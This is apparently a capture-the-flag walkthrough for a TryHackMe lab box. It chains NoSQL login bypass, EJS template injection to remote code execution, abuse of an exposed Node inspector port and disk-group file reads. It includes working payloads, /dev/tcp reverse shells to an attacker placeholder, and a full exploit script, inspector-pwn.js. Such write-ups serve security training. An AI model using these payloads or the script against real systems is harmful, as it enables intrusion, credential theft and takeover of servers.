# TryHackMe: Do Not Disturb — Walkthrough

**Room:** Do Not Disturb (Hacker Holidays — The Byte Lotus Hotel)
**Category:** Boot2Root / Web
**Difficulty:** Medium

## Briefing

> Sign's on the door. Room's active. You have access you were never given, and so does he.
>
> The anomalies stop being anomalies: a session goes warm on a sunbed, and a stranger sits down in it, a wallet signs a transaction its owner didn't authorise, a shell on the beach answers back. And it becomes clear that whoever's already inside has been moving for far longer than you have.
>
> The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. Byte Lotus never forgets. Someone is already inside. Follow his footprints in, climb the way he climbed, and recover both flags.

This briefing is not just flavor text — every line maps to a real step in the chain: a **hijacked session** (auth bypass), a **template that "answers back"** (server-side template injection), and someone who's clearly been inside longer than us (a second, more privileged local service account we have to pivot to). Keep that in mind — this room rewards taking the narrative literally rather than treating it as pure decoration.

---

## 1. Initial Recon

Standard first step: confirm the host is alive and see what's open.

```bash
ping -c 4 <TARGET_IP>
nmap -sV -sC -p22,80 <TARGET_IP>
```

Result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp open  http    Node.js (Express middleware)
```

Two things stand out immediately:
- **Port 22** — SSH, but we have no credentials yet.
- **Port 80** — a Node.js/Express app, which means the attack surface is almost certainly custom application logic rather than a known CVE in off-the-shelf software.

Browsing to the site shows a login page themed around a hotel/pool concierge app ("Byte Lotus — Poolside"), with a form posting to `/login` and a placeholder of `attendant` in the username field.

---

## 2. Enumerating the Web App

### 2.1 Directory brute-forcing

```bash
gobuster dir -u http://<TARGET_IP> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,json -t 50
```

This turned up:

```
/staff    (Status: 403)
/logout   (Status: 302) --> /
```

`/staff` existing but returning 403 told us there's a restricted, authenticated area behind the login form — our actual target. `/logout` confirmed a session-based auth mechanism was in play (Express typically uses `express-session` with a `connect.sid` cookie for this).

### 2.2 Dead ends worth mentioning

Before landing on the real vulnerability, a lot of reasonable-but-ultimately-unproductive avenues were explored. Documenting them here because they're the *correct instinct* even though they didn't pan out on this box — and ruling them out is how you confirm what the actual bug is:

- **HTTP verb/method bypass on `/staff`** — tried `OPTIONS`, `HEAD`, `POST`, `PUT` to see if the auth middleware only checked `GET`. The `OPTIONS` response returned `Allow: GET,HEAD` — no bypass here, the route genuinely only accepts those two methods and both are gated.
- **Path normalization tricks** — `/staff/.`, `/staff%2f`, `/staff/../staff`, trailing `;` and `#` — none bypassed the 403. Express normalizes these before the route match, so this class of bug wasn't present.
- **Header-based bypasses** — `X-Forwarded-For`, `X-Real-IP`, `X-Original-URL`, spoofed `Host` headers — no effect. The access control wasn't relying on trusted-proxy headers.
- **Cookie guessing** — sending made-up cookies like `role=staff`, `isStaff=true`, `auth=true` — no effect, and critically, **no `Set-Cookie` header was ever issued on unauthenticated requests at all**. This was actually a useful negative result: it told us the session cookie is only minted *after* a successful login, so the flaw had to be in the login logic itself, not in a forgeable pre-auth cookie.
- **Brute-forcing the login form** with `hydra` and a small curated password list (hotel/poolside-themed guesses like `bytelotus`, `poolside`, `staynoticed`) — all failed. This ruled out weak/default credentials as the intended path.
- **SSH with obvious usernames** (`guest`, `attendant`, `anonymous`) — all returned `Permission denied (publickey)`. Running `ssh -v` confirmed the server only offers `publickey` authentication, meaning password-based SSH brute-forcing was never going to work. SSH was a dead end for initial access, by design.

The lesson from all of this: once verb bypass, path bypass, header bypass, and credential guessing are all ruled out, the next thing to seriously consider is **injection** — because we're clearly dealing with custom backend logic that builds a database query from user input.

---

## 3. NoSQL Injection — Authentication Bypass

Express apps commonly pair with MongoDB-style datastores. When a login handler builds a query directly from `req.body` without validating types, an attacker can submit **objects instead of strings** as the username/password, using MongoDB query operators like `$ne` (not equal) or `$regex`.

Instead of sending:
```
username=attendant&password=somepassword
```

we send:
```
username[$ne]=1&password[$ne]=1
```

When this is form-encoded, Express's body parser (`express.urlencoded({ extended: true })`) interprets `username[$ne]=1` as the nested object `{ username: { "$ne": "1" } }` rather than a plain string. If the backend then runs something like:

```js
db.findOneAsync({ username, password })
```
without checking that `username`/`password` are actually strings first, the underlying query effectively becomes "find a user whose username is not `1` and whose password is not `1`" — which matches **the very first document in the collection**, regardless of what the real credentials are.

```bash
curl -i -X POST http://<TARGET_IP>/login \
  -d 'username[$ne]=1&password[$ne]=1'
```

Result:

```
HTTP/1.1 302 Found
Location: /staff
Set-Cookie: connect.sid=s%3A...; Path=/; HttpOnly
```

A valid, authenticated session — obtained without ever knowing a real password. This is exactly what the briefing meant by *"a session goes warm on a sunbed, and a stranger sits down in it"* — we forged our way into someone else's already-valid session state via injection, not by being handed access.

Since the seeded database has (at least) two accounts — a low-privilege `guest` and a higher-privilege `staff` account — we can be more precise and target a specific role using the `$regex` operator to match a known username pattern while still bypassing the password check:

```bash
curl -i -X POST http://<TARGET_IP>/login \
  -d 'username=attendant&password[$ne]=1' \
  -c cookies.txt
```

This logs us in specifically as `attendant` (a `staff`-role account) rather than whatever document happened to be first in the collection, and saves the session cookie to `cookies.txt` for reuse.

```bash
curl -i http://<TARGET_IP>/staff -b cookies.txt
```

This returns `200 OK` and a "Cabana Desk" staff console — we're in.

---

## 4. Server-Side Template Injection (SSTI) → Remote Code Execution

The staff console includes a "Confirmation template" feature: a textarea where staff can customize a guest booking message, explicitly documented as using **EJS** syntax (`<%= guest %>`), and a "Preview" button that submits to `/staff/preview`.

This is the "shell on the beach answers back" line made literal — a template engine that renders whatever we feed it.

EJS (`ejs.render()`) executes arbitrary JavaScript inside `<%= %>` / `<% %>` tags by design — that's how the templating language works. If user-controlled input is passed straight into `ejs.render()` as the *template string itself* (rather than only as a *variable* substituted into a fixed template), we get full server-side code execution.

**Step 1 — confirm expression evaluation:**

```bash
curl -s -X POST http://<TARGET_IP>/staff/preview \
  -b cookies.txt \
  --data-urlencode 'template=<%= 7*7 %>'
```

If the rendered preview shows `49` instead of the literal string `<%= 7*7 %>`, arbitrary JS expressions are being evaluated server-side.

**Step 2 — escalate to command execution**, using Node's `child_process` module (reachable from within an EJS expression via `process.mainModule.require`, since EJS templates execute in the same Node.js process as the application):

```bash
curl -s -X POST http://<TARGET_IP>/staff/preview \
  -b cookies.txt \
  --data-urlencode 'template=<%= global.process.mainModule.require("child_process").execSync("id") %>'
```

A returned `uid=...(poolside) gid=...` confirms full command execution as the `poolside` service account.

**Step 3 — get an interactive shell.**

Start a listener on the attacking machine:
```bash
nc -lvnp 4444
```

Then trigger a reverse shell through the same injection point:
```bash
curl -s -X POST http://<TARGET_IP>/staff/preview \
  -b cookies.txt \
  --data-urlencode 'template=<%= global.process.mainModule.require("child_process").execSync("bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\"") %>'
```

This lands a shell as `poolside`. From `/home/poolside/user.txt` we recover the **user flag**.

Reading the application source (`/opt/poolside/app.js`) afterward confirmed exactly what we'd inferred blind:
```js
app.post('/staff/preview', requireStaff, (req, res) => {
  const template = req.body.template || '';
  let rendered;
  try {
    rendered = ejs.render(template, { guest: req.session.user.username, hotel: 'Byte Lotus' });
  } catch (e) {
    rendered = 'Template error: ' + e.message;
  }
  res.send(staffDash(req.session.user.username, rendered, template));
});
```
User-supplied `req.body.template` is passed directly as the template string to `ejs.render()` — textbook SSTI.

---

## 5. Privilege Escalation — Pivoting via the Node.js Inspector

At this point we're `poolside`, a standard low-privilege service account (`uid=996`, single group `poolside`). `sudo -l` requires a password we don't have, and there are no obvious SUID binaries or writable cron jobs leading anywhere.

The key realization: **the briefing said someone had "been moving for far longer than [us]"** — implying another actor/process on the box. A netstat/process check reveals a second Node.js process bound to `127.0.0.1:9229` — the default port for Node's built-in **Inspector/Debug protocol**. This protocol is designed for tools like Chrome DevTools to attach to a running Node process for debugging, but if left open, it grants **arbitrary JavaScript execution in the context of whatever process is being debugged** — no authentication required beyond network access to the port.

Because `9229` is bound to localhost only, it wasn't visible in our original external nmap scan — but from *inside* the box as `poolside`, we have local access to it.

### 5.1 Talking to the Inspector protocol manually

The Inspector protocol runs over a WebSocket, which isn't something `curl` can drive on its own, so I wrote a small standalone Node.js script (I've named it `inspector-pwn.js` here — rename freely) to:

1. Query `http://127.0.0.1:9229/json/list` to discover the debugger's WebSocket URL.
2. Perform the WebSocket upgrade handshake by hand (raw TCP `net.connect`, since we don't want to depend on an external `ws` package that likely isn't installed).
3. Send a `Runtime.evaluate` command over that socket — this is the actual Chrome DevTools Protocol (CDP) method that lets you execute arbitrary JavaScript in the target process.
4. Use the evaluated JS to shell out via `child_process`, first to confirm identity (`id`), then to fire a reverse shell.

```javascript
// inspector-pwn.js
// Usage: node inspector-pwn.js <listener_ip> <listener_port>
//
// Connects to a locally-exposed Node.js Inspector/Debug port (default 9229)
// and abuses the Runtime.evaluate CDP method to execute arbitrary code in
// the context of whatever process the inspector is attached to.

const http = require('http');
const net = require('net');
const crypto = require('crypto');

const LISTENER_HOST = process.argv[2];
const LISTENER_PORT = process.argv[3];
const INSPECTOR_HOST = '127.0.0.1';
const INSPECTOR_PORT = 9229;

// Step 1: ask the inspector for its list of debuggable targets, and
// pull out the WebSocket URL we need to connect to.
function getDebuggerWebSocketUrl() {
  return new Promise((resolve, reject) => {
    http.get(`http://${INSPECTOR_HOST}:${INSPECTOR_PORT}/json/list`, (res) => {
      let data = '';
      res.on('data', (chunk) => (data += chunk));
      res.on('end', () => {
        try {
          const targets = JSON.parse(data);
          const target = (Array.isArray(targets) ? targets : [targets])
            .find((t) => t && t.webSocketDebuggerUrl);
          if (target) return resolve(target.webSocketDebuggerUrl);
          reject(new Error('No debuggable target with a WebSocket URL was found'));
        } catch (err) {
          reject(err);
        }
      });
    }).on('error', reject);
  });
}

// Step 2: a minimal hand-rolled WebSocket client, just enough to do the
// upgrade handshake and exchange JSON frames with the CDP endpoint.
class InspectorSocket {
  constructor(wsUrl) {
    this.wsUrl = wsUrl;
    this.recvBuffer = Buffer.alloc(0);
    this.pendingRequest = null;
  }

  connect() {
    return new Promise((resolve, reject) => {
      const parsedUrl = new URL(this.wsUrl);
      const wsKey = crypto.randomBytes(16).toString('base64');

      this.socket = net.connect(INSPECTOR_PORT, INSPECTOR_HOST, () => {
        const handshakeRequest = [
          `GET ${parsedUrl.pathname}${parsedUrl.search} HTTP/1.1`,
          `Host: ${INSPECTOR_HOST}:${INSPECTOR_PORT}`,
          'Upgrade: websocket',
          'Connection: Upgrade',
          `Sec-WebSocket-Key: ${wsKey}`,
          'Sec-WebSocket-Version: 13',
          '', ''
        ].join('\r\n');
        this.socket.write(handshakeRequest);
      });

      let handshakeResponse = '';
      let handshakeComplete = false;

      this.socket.on('data', (chunk) => {
        if (!handshakeComplete) {
          handshakeResponse += chunk.toString('utf8');
          const headerEnd = handshakeResponse.indexOf('\r\n\r\n');
          if (headerEnd === -1) return; // wait for the rest of the headers
          handshakeComplete = true;
          this.recvBuffer = Buffer.from(handshakeResponse.slice(headerEnd + 4), 'utf8');
          this._processFrames();
          resolve();
        } else {
          this.recvBuffer = Buffer.concat([this.recvBuffer, chunk]);
          this._processFrames();
        }
      });

      this.socket.on('error', reject);
    });
  }

  // Parses whatever complete WebSocket frames are sitting in the buffer.
  _processFrames() {
    while (this.recvBuffer.length >= 2) {
      const opcode = this.recvBuffer[0] & 0x0f;
      let payloadLen = this.recvBuffer[1] & 0x7f;
      let offset = 2;

      if (payloadLen === 126) {
        payloadLen = this.recvBuffer.readUInt16BE(2);
        offset = 4;
      } else if (payloadLen === 127) {
        payloadLen = Number(this.recvBuffer.readBigUInt64BE(2));
        offset = 10;
      }

      if (this.recvBuffer.length < offset + payloadLen) return; // incomplete frame, wait for more data

      const payload = this.recvBuffer.slice(offset, offset + payloadLen);
      this.recvBuffer = this.recvBuffer.slice(offset + payloadLen);

      if (opcode === 1) { // text frame
        const message = JSON.parse(payload.toString('utf8'));
        if (this.pendingRequest && this.pendingRequest.id === message.id) {
          this.pendingRequest.resolve(message);
          this.pendingRequest = null;
        }
      }
    }
  }

  // Sends a single CDP command as a masked WebSocket text frame
  // (client-to-server frames must be masked per the WS spec).
  send(command) {
    const payload = Buffer.from(JSON.stringify(command));
    const mask = crypto.randomBytes(4);
    const maskedPayload = Buffer.alloc(payload.length);
    for (let i = 0; i < payload.length; i++) {
      maskedPayload[i] = payload[i] ^ mask[i % 4];
    }

    let frameHeader;
    if (payload.length < 126) {
      frameHeader = Buffer.alloc(6);
      frameHeader[0] = 0x81; // FIN + text opcode
      frameHeader[1] = 0x80 | payload.length; // masked + length
      mask.copy(frameHeader, 2);
    } else {
      frameHeader = Buffer.alloc(8);
      frameHeader[0] = 0x81;
      frameHeader[1] = 0x80 | 126;
      frameHeader.writeUInt16BE(payload.length, 2);
      mask.copy(frameHeader, 4);
    }

    this.socket.write(Buffer.concat([frameHeader, maskedPayload]));
    return new Promise((resolve) => {
      this.pendingRequest = { id: command.id, resolve };
    });
  }
}

(async () => {
  const wsUrl = await getDebuggerWebSocketUrl();
  const inspector = new InspectorSocket(wsUrl);
  await inspector.connect();
  console.log('[+] Connected to Node.js inspector at ' + wsUrl);

  // Sanity check: confirm which user this process is running as.
  const idResult = await inspector.send({
    id: 1,
    method: 'Runtime.evaluate',
    params: {
      expression: "process.mainModule.require('child_process').execSync('id').toString()"
    }
  });
  console.log('[+] Target process is running as: ' + JSON.stringify(idResult.result.result.value));

  // Fire a detached reverse shell so it survives after this script exits.
  const reverseShellExpr =
    `(process.mainModule.require('child_process').spawn('/bin/bash', ` +
    `['-c', 'bash -i >& /dev/tcp/${LISTENER_HOST}/${LISTENER_PORT} 0>&1'], ` +
    `{ detached: true, stdio: 'ignore' }).unref(), 'reverse shell dispatched')`;

  await inspector.send({ id: 2, method: 'Runtime.evaluate', params: { expression: reverseShellExpr } });
  console.log(`[+] Reverse shell payload sent — check your listener on ${LISTENER_HOST}:${LISTENER_PORT}`);

  setTimeout(() => process.exit(0), 2000);
})().catch((err) => {
  console.error('[-] Error: ' + err.message);
  process.exit(1);
});
```

Usage, from the `poolside` shell:

```bash
# Start a listener on your attacker machine first:
#   nc -lvnp 4445
node /tmp/inspector-pwn.js <ATTACKER_IP> 4445
```

Output:
```
[+] Connected to Node.js inspector at ws://127.0.0.1:9229/...
[+] Target process is running as: "uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)\n"
[+] Reverse shell payload sent — check your listener on <ATTACKER_IP>:4445
```

The listener catches a shell as **`pipelinesvc`** — a *different* local service account from the one we started as. This is the "someone else has been inside longer" pivot: a separate, unattended Node.js process (a telemetry/pipeline service) was running with its debug port left open on localhost, and it happened to belong to a user with a far more interesting group membership: **`disk`**.

---

## 6. Root via the `disk` Group

Membership in the `disk` group grants read/write access to raw block devices (`/dev/sdX`, `/dev/nvmeXnY`, etc.) — bypassing the filesystem's normal permission checks entirely, because you're reading the disk at the block level rather than going through the filesystem layer that enforces those permissions.

First, confirm device access:
```bash
lsblk
ls -la /dev/nvme0n1p1
```
```
brw-rw---- 1 root disk 259, 2 ... /dev/nvme0n1p1
```

Group `disk` has read/write on that device node — and we're in that group.

`debugfs` (part of `e2fsprogs`, commonly pre-installed) can read files directly from an ext4 filesystem image or block device, given raw access to it:

```bash
debugfs -R "ls /root" /dev/nvme0n1p1
debugfs -R "cat /root/root.txt" /dev/nvme0n1p1
```

This returns the contents of `/root/root.txt` — the **root flag** — without ever needing an actual root shell, sudo access, or a kernel exploit. The entire privilege escalation is achieved purely through the `disk` group membership.

(From here, full persistence/root access could also be achieved by pulling `/etc/shadow` or `/root/.ssh/id_rsa` the same way and cracking or reusing them — but reading the flag directly is sufficient for the room's objective.)

---

## 7. Summary of the Chain

| Stage | Technique | Result |
|---|---|---|
| Initial recon | nmap, gobuster | Found `/staff` (403) behind session auth |
| Auth bypass | NoSQL injection (`$ne` / `$regex` operators via nested form params) | Valid `staff`-role session cookie |
| Foothold | EJS Server-Side Template Injection in `/staff/preview` | RCE as `poolside` → user flag |
| Pivot | Abused an exposed Node.js Inspector/Debug port (9229, localhost-only) via a hand-written CDP/WebSocket client | Shell as `pipelinesvc` |
| Privilege escalation | `pipelinesvc` was a member of the `disk` group → raw block-device access via `debugfs` | Root flag read directly off disk |

**Key takeaway:** the flavor text wasn't decorative — "a session goes warm... a stranger sits down in it" was the NoSQL auth bypass, "a shell on the beach answers back" was the SSTI, and "someone already inside... moving for far longer" was the second service account reachable only through the leftover debug port. Reading the narrative literally, once the obvious bypass attempts were exhausted, was the fastest way to the intended path.

*(Flags intentionally omitted from this writeup — re-run the steps above against your own instance to obtain them.)*
